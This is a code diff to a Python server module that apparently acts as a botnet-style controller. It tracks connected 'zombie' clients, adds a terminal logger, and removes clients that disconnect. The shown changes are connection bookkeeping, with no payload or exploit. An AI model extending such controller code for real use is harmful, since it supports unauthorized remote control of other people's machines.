@@ -16,6 +16,7 @@ from time import sleep
 from modules.logger import Logger
 
 serverLogger = Logger(file_name='server')
+terminalLogger = Logger(file_name='terminal')
 
 class ServerModule:
     def __init__(self, lip, lport, is_from_gui, zombies_gui_tab=None):
@@ -83,7 +84,8 @@ class ServerModule:
             self.create_communicator(client_socket, client_conn_tuple[0],client_conn_tuple[1])
 
     def create_communicator(self, zombie_socket, ip, port):
-        zombie_default_communicator = Communicator(zombie_socket=zombie_socket, zombie_ip=ip, zombie_port=port)
+        zombie_default_communicator = Communicator(zombie_socket=zombie_socket, zombie_ip=ip, zombie_port=port,
+                                                   server_module_class=self)
         print(Fore.YELLOW + 'hello' + Fore.RESET + ' message sent to {}:{}.'.format(ip,port))
 
         # add zombie ip:port and communicator in temp list (before get hello_back msg) usage: close connection before receive msg
@@ -165,6 +167,17 @@ class ServerModule:
     def push_text_in_terminal_box(self, text):
         push_text_in_terminal_module(is_from_gui=self.is_from_gui, terminal_window_box=self.terminal_window_box,
                                      text=text)
+
+    def remove_zombie(self, z_address):
+        '''
+        remove zombie from zombies_addresses_and_communicators_list when:
+        the zombie is disconnected
+        '''
+        for temp_z in self.zombies_addresses_and_communicators_list:
+            if z_address == temp_z[0]:
+                self.zombies_addresses_and_communicators_list.remove(temp_z)
+                terminalLogger.log(text=f'Connection with {z_address} closed!')
+                break
 
     def stop_server(self):
         self.connection_status = 0
